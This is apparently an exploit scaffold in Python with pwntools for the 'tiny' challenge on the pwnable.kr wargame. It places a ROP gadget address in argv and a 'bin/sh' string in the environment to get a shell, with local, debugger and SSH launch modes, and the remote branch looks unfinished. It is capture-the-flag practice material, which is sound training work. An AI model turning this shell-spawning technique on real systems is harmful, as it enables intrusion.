from pwn import *

binary_name = "tiny"


env = dict()
env["1"] = "1"
env["2"] = "2"
env["3"] = "2"
env[""] = "bin/sh"
env["99999999"] = "2"


add_esp_pop_ebx=0xf7ffc8ab
argv = [p32(add_esp_pop_ebx), "A", "A", "A", "A", "A", "A","A", "A", "A", "A"]


def main():
    if(len(sys.argv) <2):
        print("Need to specify target.")
    else:
        if(sys.argv[1] == "remote"):
            s = ssh(user='tiny',host='pwnable.kr',port=2222,password='guest') 
            p= s.process(f"./{binary_name}") 
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(["./tiny"]+argv,  env=env, aslr=False)
            sleep(10000)
        else:
            p = process(argv=argv, executable='./tiny', env=env,aslr=False)


main()
